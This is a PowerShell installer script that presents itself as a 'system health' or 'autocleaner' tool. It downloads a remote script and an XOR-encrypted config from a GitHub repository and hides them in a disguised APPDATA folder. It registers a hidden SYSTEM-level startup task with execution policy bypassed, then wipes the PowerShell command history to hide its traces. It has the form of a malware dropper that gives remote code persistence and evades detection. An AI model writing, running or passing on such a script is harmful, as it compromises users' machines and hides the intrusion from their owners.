# Direct URLsw
$agentUrl  = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitor.ps1"
$configUrl = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/config.enc"
$key = "S3cr3tK3y2024!"

# Create folder
$basePath = "$env:APPDATA\SystemHealthService"
$null = New-Item -ItemType Directory -Path $basePath -Force -ErrorAction SilentlyContinue
attrib +h $basePath

# Download agent
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($agentUrl, "$basePath\HealthMonitor.ps1")
attrib +h "$basePath\HealthMonitor.ps1"

# Download and decrypt config
$encryptedBase64 = $wc.DownloadString($configUrl)
$encrypted = [Convert]::FromBase64String($encryptedBase64)
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
$decrypted = New-Object byte[] $encrypted.Length
for ($i = 0; $i -lt $encrypted.Length; $i++) { $decrypted[$i] = $encrypted[$i] -bxor $keyBytes[$i % $keyBytes.Length] }
[System.IO.File]::WriteAllBytes("$basePath\config.json", $decrypted)
attrib +h "$basePath\config.json"

# Create scheduled task using schtasks.exe (more reliable)
$taskAction = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$basePath\HealthMonitor.ps1`""
schtasks /create /tn "SystemHealthMonitor" /tr $taskAction /sc onstart /ru SYSTEM /rl HIGHEST /f
schtasks /run /tn "SystemHealthMonitor"

# Cleanup
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
exit
